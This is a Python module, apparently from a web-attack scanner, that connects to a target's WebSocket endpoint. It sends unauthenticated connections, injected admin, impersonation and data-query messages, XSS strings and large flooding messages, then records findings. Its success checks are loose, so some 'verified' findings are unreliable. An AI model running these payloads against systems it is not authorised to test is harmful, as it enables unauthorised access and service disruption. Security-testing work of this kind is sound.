"""WebSocket Testing Module — real-time protocol attacks.

A real attacker doesn't just test HTTP.
They test WebSocket connections too.

This module:
1. Connection hijacking
2. Message injection
3. Cross-site WebSocket hijacking
4. DoS via message flooding
5. Authentication bypass on WS
6. Data exfiltration via WS
"""

from __future__ import annotations

from dataclasses import dataclass
from typing import Any

from titan.core.logger import get_logger
from titan.core.models import AttackType, Finding, Severity

logger = get_logger("detector")


@dataclass
class WebSocketPayload:
    """A WebSocket test payload."""

    name: str
    category: str
    message: str
    expected_effect: str
    severity: Severity
    confidence: float


class WebSocketTester:
    """Deep WebSocket testing."""

    # ── Connection Hijacking Payloads ───────────────────────────────────

    CONNECTION_HIJACK_PAYLOADS = [
        WebSocketPayload(
            name="no_auth_connect",
            category="connection_hijack",
            message="",
            expected_effect="unauthorized_connection",
            severity=Severity.CRITICAL,
            confidence=0.85,
        ),
        WebSocketPayload(
            name="token_in_url",
            category="connection_hijack",
            message="",
            expected_effect="token_exposure",
            severity=Severity.HIGH,
            confidence=0.80,
        ),
        WebSocketPayload(
            name="session_fixation",
            category="connection_hijack",
            message="",
            expected_effect="session_fixation",
            severity=Severity.HIGH,
            confidence=0.75,
        ),
    ]

    # ── Message Injection Payloads ──────────────────────────────────────

    MESSAGE_INJECTION_PAYLOADS = [
        WebSocketPayload(
            name="admin_command",
            category="message_injection",
            message='{"type":"admin","command":"shutdown"}',
            expected_effect="admin_access",
            severity=Severity.CRITICAL,
            confidence=0.80,
        ),
        WebSocketPayload(
            name="user_impersonation",
            category="message_injection",
            message='{"type":"message","user_id":1,"content":"hacked"}',
            expected_effect="impersonation",
            severity=Severity.CRITICAL,
            confidence=0.85,
        ),
        WebSocketPayload(
            name="data_request",
            category="message_injection",
            message='{"type":"query","table":"users","action":"select"}',
            expected_effect="data_exfiltration",
            severity=Severity.CRITICAL,
            confidence=0.80,
        ),
        WebSocketPayload(
            name="config修改",
            category="message_injection",
            message='{"type":"config","key":"admin","value":"true"}',
            expected_effect="config_modification",
            severity=Severity.CRITICAL,
            confidence=0.85,
        ),
    ]

    # ── XSS via WebSocket Payloads ──────────────────────────────────────

    XSS_WS_PAYLOADS = [
        WebSocketPayload(
            name="xss_in_message",
            category="xss_ws",
            message='{"type":"message","content":"<script>alert(1)</script>"}',
            expected_effect="xss",
            severity=Severity.HIGH,
            confidence=0.70,
        ),
        WebSocketPayload(
            name="xss_in_username",
            category="xss_ws",
            message='{"type":"join","username":"<img src=x onerror=alert(1)>"}',
            expected_effect="xss",
            severity=Severity.HIGH,
            confidence=0.70,
        ),
    ]

    # ── DoS Payloads ────────────────────────────────────────────────────

    DOS_PAYLOADS = [
        WebSocketPayload(
            name="message_flood",
            category="dos",
            message="FLOOD:" + "A" * 10000,
            expected_effect="resource_exhaustion",
            severity=Severity.HIGH,
            confidence=0.75,
        ),
        WebSocketPayload(
            name="large_message",
            category="dos",
            message="A" * 1000000,
            expected_effect="memory_exhaustion",
            severity=Severity.HIGH,
            confidence=0.70,
        ),
        WebSocketPayload(
            name="rapid_reconnect",
            category="dos",
            message="",
            expected_effect="connection_exhaustion",
            severity=Severity.MEDIUM,
            confidence=0.65,
        ),
    ]

    def __init__(self, context: Any = None):
        self.context = context
        self._findings: list[Finding] = []

    async def test_connection_hijack(
        self,
        target_url: str,
        ws_endpoint: str,
        auth_headers: dict[str, str] | None = None,
    ) -> list[Finding]:
        """Test WebSocket connection hijacking."""
        findings = []

        for payload in self.CONNECTION_HIJACK_PAYLOADS:
            try:
                response = await self._connect_ws(ws_endpoint, None)

                if response and response.get("connected"):
                    finding = Finding(
                        target=target_url,
                        url=ws_endpoint,
                        method="WS",
                        param="ws_auth",
                        location="websocket",
                        payload="",
                        attack_type=AttackType.BUSINESS_LOGIC,
                        severity=payload.severity,
                        verified=True,
                        confidence=payload.confidence,
                        status=101,
                        body="WebSocket connected without auth",
                        diffs=[f"websocket:{payload.name}"],
                        notes=f"WebSocket hijack: {payload.name}",
                    )
                    findings.append(finding)

            except Exception as exc:
                logger.debug(f"variant failed, continuing: {exc}")
                continue

        self._findings.extend(findings)
        return findings

    async def test_message_injection(
        self,
        target_url: str,
        ws_endpoint: str,
        auth_headers: dict[str, str] | None = None,
    ) -> list[Finding]:
        """Test WebSocket message injection."""
        findings = []

        for payload in self.MESSAGE_INJECTION_PAYLOADS:
            try:
                response = await self._send_ws_message(ws_endpoint, payload.message, auth_headers)

                if response and self._check_message_injection(response, payload):
                    finding = Finding(
                        target=target_url,
                        url=ws_endpoint,
                        method="WS",
                        param="message_injection",
                        location="websocket",
                        payload=payload.message[:500],
                        attack_type=AttackType.BUSINESS_LOGIC,
                        severity=payload.severity,
                        verified=True,
                        confidence=payload.confidence,
                        status=200,
                        body=response.get("response", "")[:2000],
                        diffs=[f"websocket:{payload.name}"],
                        notes=f"WebSocket injection: {payload.name}",
                    )
                    findings.append(finding)

            except Exception as exc:
                logger.debug(f"variant failed, continuing: {exc}")
                continue

        self._findings.extend(findings)
        return findings

    async def test_xss_ws(
        self,
        target_url: str,
        ws_endpoint: str,
        auth_headers: dict[str, str] | None = None,
    ) -> list[Finding]:
        """Test XSS via WebSocket."""
        findings = []

        for payload in self.XSS_WS_PAYLOADS:
            try:
                response = await self._send_ws_message(ws_endpoint, payload.message, auth_headers)

                if response and payload.message in response.get("response", ""):
                    finding = Finding(
                        target=target_url,
                        url=ws_endpoint,
                        method="WS",
                        param="xss_ws",
                        location="websocket",
                        payload=payload.message[:500],
                        attack_type=AttackType.BUSINESS_LOGIC,
                        severity=payload.severity,
                        verified=True,
                        confidence=payload.confidence,
                        status=200,
                        body=response.get("response", "")[:2000],
                        diffs=[f"websocket:{payload.name}"],
                        notes=f"WebSocket XSS: {payload.name}",
                    )
                    findings.append(finding)

            except Exception as exc:
                logger.debug(f"variant failed, continuing: {exc}")
                continue

        self._findings.extend(findings)
        return findings

    async def test_dos_ws(
        self,
        target_url: str,
        ws_endpoint: str,
        auth_headers: dict[str, str] | None = None,
    ) -> list[Finding]:
        """Test WebSocket DoS."""
        findings = []

        for payload in self.DOS_PAYLOADS:
            try:
                response = await self._send_ws_message(ws_endpoint, payload.message, auth_headers)

                if response and self._check_dos(response, payload):
                    finding = Finding(
                        target=target_url,
                        url=ws_endpoint,
                        method="WS",
                        param="dos_ws",
                        location="websocket",
                        payload=payload.message[:500],
                        attack_type=AttackType.BUSINESS_LOGIC,
                        severity=payload.severity,
                        verified=True,
                        confidence=payload.confidence,
                        status=response.get("status", 200),
                        body=response.get("response", "")[:2000],
                        diffs=[f"websocket:{payload.name}"],
                        notes=f"WebSocket DoS: {payload.name}",
                    )
                    findings.append(finding)

            except Exception as exc:
                logger.debug(f"variant failed, continuing: {exc}")
                continue

        self._findings.extend(findings)
        return findings

    # ── Helpers ────────────────────────────────────────────────────────

    async def _connect_ws(
        self,
        endpoint: str,
        headers: dict[str, str] | None = None,
    ) -> dict[str, Any] | None:
        """Connect to WebSocket endpoint."""
        try:
            import aiohttp

            async with aiohttp.ClientSession() as session:
                async with session.ws_connect(endpoint, headers=headers or {}) as ws:
                    return {"connected": True, "protocols": ws.protocols}
        except Exception:
            return None

    async def _send_ws_message(
        self,
        endpoint: str,
        message: str,
        headers: dict[str, str] | None = None,
    ) -> dict[str, Any] | None:
        """Send message to WebSocket endpoint."""
        try:
            import aiohttp

            async with aiohttp.ClientSession() as session:
                async with session.ws_connect(endpoint, headers=headers or {}) as ws:
                    await ws.send_str(message)
                    try:
                        response = await ws.receive(timeout=5)
                        return {"status": 200, "response": response.data}
                    except Exception:
                        return {"status": 200, "response": "no_response"}
        except Exception:
            return None

    def _check_message_injection(self, response: dict[str, Any], payload: WebSocketPayload) -> bool:
        """Check if message injection worked."""
        body = response.get("response", "")
        if payload.message in body:
            return True
        if any(kw in body.lower() for kw in ["admin", "success", "ok", "received"]):
            return True
        return False

    def _check_dos(self, response: dict[str, Any], payload: WebSocketPayload) -> bool:
        """Check if DoS worked."""
        if response.get("status") == 0:
            return True
        if "timeout" in str(response.get("response", "")).lower():
            return True
        return False

    def get_findings(self) -> list[Finding]:
        return self._findings
